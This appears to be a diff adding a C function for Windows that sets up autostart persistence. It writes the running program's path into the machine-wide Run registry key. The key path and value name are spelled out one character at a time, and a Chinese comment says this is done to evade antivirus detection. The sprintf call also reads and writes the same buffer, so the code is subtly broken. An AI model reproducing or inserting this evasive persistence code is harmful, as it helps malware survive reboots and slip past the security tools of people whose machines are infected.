@@ -1,0 +1,67 @@
+void ziqidong(void)
+{
+	char str[100];
+	HMODULE hModule1 = GetModuleHandle(NULL);
+	GetModuleFileNameA(hModule1,str,sizeof(str));//str为文件绝对路径
+
+	HKEY hKey;
+	char kjpre[46];
+	kjpre[0] = 'S';
+	kjpre[1] = 'O';
+	kjpre[2] = 'F';
+	kjpre[3] = 'T';
+	kjpre[4] = 'W';
+	kjpre[5] = 'A';
+	kjpre[6] = 'R';
+	kjpre[7] = 'E';
+	kjpre[8] = '\\';
+	kjpre[9] = 'M';
+	kjpre[10] = 'i';
+	kjpre[11] = 'c';
+	kjpre[12] = 'r';
+	kjpre[13] = 'o';
+	kjpre[14] = 's';
+	kjpre[15] = 'o';
+	kjpre[16] = 'f';
+	kjpre[17] = 't';
+	kjpre[18] = '\\';
+	kjpre[19] = 'W';
+	kjpre[20] = 'i';
+	kjpre[21] = 'n';
+	kjpre[22] = 'd';
+	kjpre[23] = 'o';
+	kjpre[24] = 'w';
+	kjpre[25] = 's';
+	kjpre[26] = '\\';
+	kjpre[27] = 'C';
+	kjpre[28] = 'u';
+	kjpre[29] = 'r';
+	kjpre[30] = 'r';
+	kjpre[31] = 'e';
+	kjpre[32] = 'n';
+	kjpre[33] = 't';
+	kjpre[34] = 'V';
+	kjpre[35] = 'e';
+	kjpre[36] = 'r';
+	kjpre[37] = 's';
+	kjpre[38] = 'i';
+	kjpre[39] = 'o';
+	kjpre[40] = 'n';
+	kjpre[41] = '\\';
+	kjpre[42] = 'R';
+	kjpre[43] = 'u';
+	kjpre[44] = 'n';
+	kjpre[45] = '\0';
+
+	RegOpenKeyA(HKEY_LOCAL_MACHINE,kjpre,&hKey);
+	char  pggxr1[20] = "t";//自启动名称 用字符免杀生成字符串
+	char * pggxr2 = "e";
+	char * pggxr3 = "s";
+	char * pggxr4 = "t";
+	sprintf(pggxr1,"%s%s%s%s",pggxr1,pggxr2,pggxr3,pggxr4);
+
+	const unsigned char * str100 = (unsigned char * )str;
+
+	RegSetValueExA(hKey,pggxr1,0,REG_SZ,str100,strlen(str));
+	RegCloseKey(hKey);
+}
